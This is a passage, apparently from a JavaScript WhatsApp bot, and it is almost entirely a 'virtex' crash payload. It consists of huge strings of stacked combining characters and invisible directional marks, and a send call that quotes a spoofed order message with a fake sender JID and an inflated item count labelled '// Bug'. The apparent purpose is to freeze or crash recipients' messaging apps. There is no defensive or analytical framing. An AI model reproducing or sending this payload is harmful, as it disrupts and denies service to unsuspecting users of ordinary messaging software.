̧̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙̾̆͌̋̈́͟⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡',
                        jpegThumbnail: bro },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 70000, // Bug
    status: 1,
    surface: 1,
     message: 'ʀᴀɴᴢ̷',
    orderTitle: 'fake', // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})

wew = fs.readFileSync(`./hm/vvirgamv2.jpeg`)
lzain = `
★‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎